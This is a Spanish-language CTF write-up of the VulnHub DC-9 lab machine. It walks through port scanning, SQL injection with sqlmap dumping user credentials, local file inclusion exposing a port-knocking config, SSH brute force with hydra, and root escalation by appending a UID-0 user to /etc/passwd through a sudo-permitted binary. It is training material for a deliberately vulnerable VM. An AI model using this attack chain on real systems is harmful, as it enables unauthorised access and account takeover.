# DC-9
Desarrollo del CTF DC:9

## 1. Download de la VM: 

https://www.vulnhub.com/entry/dc-9,412/

##2. Escaneo de Puertos

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up (0.00052s latency).
Not shown: 65533 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:F4:57:3F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_1.jpg" width=80% />

## 3. Enumeración

## 3.1. Enumeración WEB 
- Ejecutamos GOBUSTER y DIRSEARCH

```
gobuster -u http://10.10.10.138:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"
```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_5.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_7.jpg" width=80% />

- El NIKTO no nos da nada importante


```
nikto -ask=no -h http://10.10.10.138:80
Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.138
+ Target Hostname:    10.10.10.138
+ Target Port:        80
+ Start Time:         2021-03-12 08:42:35 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-03-12 08:43:31 (GMT-5) (56 seconds)
```

## 4. Buscando Vulnerabilidades

### 4.1. Inyección SQL

- En la sección "SEARCH" podemos identificar una inyección SQL básica. Toca explotarla.

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_2.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_3.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_4.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_8.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_9.jpg" width=80% />

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_10.jpg" width=80% />

- Debido a que la inyección está super sencilla podemos utilizar SQLMAP para automatizar la explotación.
- Colocamos el REQUEST en un archivo de texto a explotar la vuln.

```
root@kali:~/DC9# cat sqli.txt 
POST /results.php HTTP/1.1
Host: 10.10.10.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.138/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close
Upgrade-Insecure-Requests: 1

search=1
```

```
root@kali:~/DC9# sqlmap -r sqli.txt -p search --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.3.14#dev}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
      
available databases [3]:
[*] information_schema
[*] Staff
[*] users

Database: Staff
Table: StaffDetails
[17 entries]
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+
| id | phone          | email                 | reg_date            | lastname   | firstname | position                      |
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+
| 1  | 46478415155456 | marym@example.com     | 2019-05-01 17:32:00 | Moe        | Mary      | CEO                           |
| 2  | 46457131654    | julied@example.com    | 2019-05-01 17:32:00 | Dooley     | Julie     | Human Resources               |
| 3  | 46415323       | fredf@example.com     | 2019-05-01 17:32:00 | Flintstone | Fred      | Systems Administrator         |
| 4  | 324643564      | barneyr@example.com   | 2019-05-01 17:32:00 | Rubble     | Barney    | Help Desk                     |
| 5  | 802438797      | tomc@example.com      | 2019-05-01 17:32:00 | Cat        | Tom       | Driver                        |
| 6  | 24342654756    | jerrym@example.com    | 2019-05-01 17:32:00 | Mouse      | Jerry     | Stores                        |
| 7  | 243457487      | wilmaf@example.com    | 2019-05-01 17:32:00 | Flintstone | Wilma     | Accounts                      |
| 8  | 90239724378    | bettyr@example.com    | 2019-05-01 17:32:00 | Rubble     | Betty     | Junior Accounts               |
| 9  | 189024789      | chandlerb@example.com | 2019-05-01 17:32:00 | Bing       | Chandler  | President - Sales             |
| 10 | 232131654      | joeyt@example.com     | 2019-05-01 17:32:00 | Tribbiani  | Joey      | Janitor                       |
| 11 | 823897243978   | rachelg@example.com   | 2019-05-01 17:32:00 | Green      | Rachel    | Personal Assistant            |
| 12 | 6549638203     | rossg@example.com     | 2019-05-01 17:32:00 | Geller     | Ross      | Instructor                    |
| 13 | 8092432798     | monicag@example.com   | 2019-05-01 17:32:00 | Geller     | Monica    | Marketing                     |
| 14 | 43289079824    | phoebeb@example.com   | 2019-05-01 17:32:02 | Buffay     | Phoebe    | Assistant Janitor             |
| 15 | 454786464      | scoots@example.com    | 2019-05-01 20:16:33 | McScoots   | Scooter   | Resident Cat                  |
| 16 | 65464646479741 | janitor@example.com   | 2019-12-23 03:11:39 | Trump      | Donald    | Replacement Janitor           |
| 17 | 47836546413    | janitor2@example.com  | 2019-12-24 03:41:04 | Morrison   | Scott     | Assistant Replacement Janitor |
+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+


Database: Staff
Table: Users
[1 entry]
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |		
+--------+----------+----------------------------------+


Database: users
Table: UserDetails
[17 entries]
+----+-----------+------------+---------------------+---------------+-----------+
| id | username  | lastname   | reg_date            | password      | firstname |
+----+-----------+------------+---------------------+---------------+-----------+
| 1  | marym     | Moe        | 2019-12-29 16:58:26 | 3kfs86sfd     | Mary      |
| 2  | julied    | Dooley     | 2019-12-29 16:58:26 | 468sfdfsd2    | Julie     |
| 3  | fredf     | Flintstone | 2019-12-29 16:58:26 | 4sfd87sfd1    | Fred      |
| 4  | barneyr   | Rubble     | 2019-12-29 16:58:26 | RocksOff      | Barney    |
| 5  | tomc      | Cat        | 2019-12-29 16:58:26 | TC&TheBoyz    | Tom       |
| 6  | jerrym    | Mouse      | 2019-12-29 16:58:26 | B8m#48sd      | Jerry     |
| 7  | wilmaf    | Flintstone | 2019-12-29 16:58:26 | Pebbles       | Wilma     |
| 8  | bettyr    | Rubble     | 2019-12-29 16:58:26 | BamBam01      | Betty     |
| 9  | chandlerb | Bing       | 2019-12-29 16:58:26 | UrAG0D!       | Chandler  |
| 10 | joeyt     | Tribbiani  | 2019-12-29 16:58:26 | Passw0rd      | Joey      |
| 11 | rachelg   | Green      | 2019-12-29 16:58:26 | yN72#dsd      | Rachel    |
| 12 | rossg     | Geller     | 2019-12-29 16:58:26 | ILoveRachel   | Ross      |
| 13 | monicag   | Geller     | 2019-12-29 16:58:26 | 3248dsds7s    | Monica    |
| 14 | phoebeb   | Buffay     | 2019-12-29 16:58:26 | smellycats    | Phoebe    |
| 15 | scoots    | McScoots   | 2019-12-29 16:58:26 | YR3BVxxxw87   | Scooter   |
| 16 | janitor   | Trump      | 2019-12-29 16:58:26 | Ilovepeepee   | Donald    |
| 17 | janitor2  | Morrison   | 2019-12-29 16:58:28 | Hawaii-Five-0 | Scott     |
+----+-----------+------------+---------------------+---------------+-----------+

```

- Dentro encontramos admin:856f5de590ef37314e7c3bdf6f8a66dc. Podemos hacer cracking del hash MD5 identificado: https://hashes.com/en/decrypt/hash --> transorbital1

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_15.jpg" width=80% />

- Ingresamos a la aplicación con el usuario admin:transorbital1

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_16.jpg" width=80% />

### 4.2. LOCAL FILE INCLUSION (LFI)

- Hasta este punto sólo se tiene acceso a la aplicación web. Traté un LOAD_FILE a través de SQLi pero no funcionó.
- Había algo peculiar en la página "MANAGE", hablaban de un FILE que no existe. Tocaba probar por todos los métodos con ese parámetro.

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_17jpg" width=80% />

- Al final encontramos LFI y ya podemos leer archivos del servidor. Alguno debe tener algo que me sirva para obtener consola.
- Con ayuda del BURP y este listado: https://github.com/hussein98d/LFI-files/blob/master/list.txt podemos buscar archivos importantes.

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_18jpg" width=80% />

- De todos los archivos que aparecen en la imagen superior el que llama la atención es /etc/knockd.conf
- PORT KNOCKING es una manera de esconder puertos. Se puede abrir un puerto si es que se "toca" de manera correcta los puertos en el servidor.

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_19.jpg" width=80% />


### 4.3. Abrimos el puerto SSH 

```
root@kali:~/DC9# knock 10.10.10.138 7469 8475 9842
```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_12.jpg" width=80% />

### 4.4. Conexión SSH

- Ahora que tenemos SSH abierto, probemos el acceso con las credenciales obtenidas a través de SQLi.

```
root@kali:~/DC9# hydra -L users.txt -P pass.txt ssh://10.10.10.138
[22][ssh] host: 10.10.10.138   login: chandlerb   password: UrAG0D!
[22][ssh] host: 10.10.10.138   login: joeyt       password: Passw0rd
[22][ssh] host: 10.10.10.138   login: janitor     password: Ilovepeepee
```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_13.jpg" width=80% />


## 5. Elevando Privilegios

- De los usuarios obtenidos ninguno parecía tener nada importante con excepción del usuario JANITOR.
- Siempre toca buscar en todos los usuarios, cualquiera puede tener algo.
- El usuario JANITOR tiene un archivo con credenciales de acceso. Toca probarlos una vez mas.

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_20.jpg" width=80% />

- Probamos las credneciales una vez mas.

```
root@kali:~/DC9# hydra -L users.txt -P pass.txt ssh://10.10.10.138
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-12 12:36:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 414 login tries (l:18/p:23), ~26 tries per task
[DATA] attacking ssh://10.10.10.138:22/
[22][ssh] host: 10.10.10.138   login: fredf   password: B4-Tru3-001
[22][ssh] host: 10.10.10.138   login: chandlerb   password: UrAG0D!
[22][ssh] host: 10.10.10.138   login: joeyt   password: Passw0rd
[22][ssh] host: 10.10.10.138   login: janitor   password: Ilovepeepee
```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_21.jpg" width=80% />

- Bingo!! un acceso mas fredf:B4-Tru3-001. Nos conectamos.

### 5.1. Elevar privilegios a través de SUDO

- Obtenemos información a través de SUDO. Podemos ejecutar el script TEST con privilegios de ROOT.

```
root@kali:~/DC9# ssh fredf@10.10.10.138
fredf@10.10.10.138's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 13 03:38:49 2021 from 10.10.10.133
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

- Probamos el SCRIPT y parece ser un archivo de COPIA. Toca probar porque al inicio no entendía como utilizarlo.

```
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /etc/passwd passwd.txt
fredf@dc-9:~$ cat passwd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
```
<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_22.jpg" width=80% />


### 5.2. Modificar el archivo PASSWD

- Al principio parecía un SCRIPT que copiaba pero si el archivo final ya existe realmente le añade información.
- Mi primera intención fue crear un archivo SHADOW modificado pero luego me di cuenta que NO serviría porque no puedo crear un nuevo SHADOW solo añadir información al final. Descartado.
- Entonces podemos añadir información final al archivo PASSWD y a través de este archivo podemos elevar privilegios.

```
En KALI:
root@kali:~/DC9# mkpasswd  -m sha-512 -S saltsalt -s
Password: password
$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/

En la VM DC-9
fredf@dc-9:~$ cat add.txt 
omar5:$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/:0:0::/root/:/bin/bash
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test add.txt /etc/passwd
fredf@dc-9:~$ su omar5

```

<img src="https://github.com/El-Palomo/DC-9/blob/main/dc9_23.jpg" width=80% />










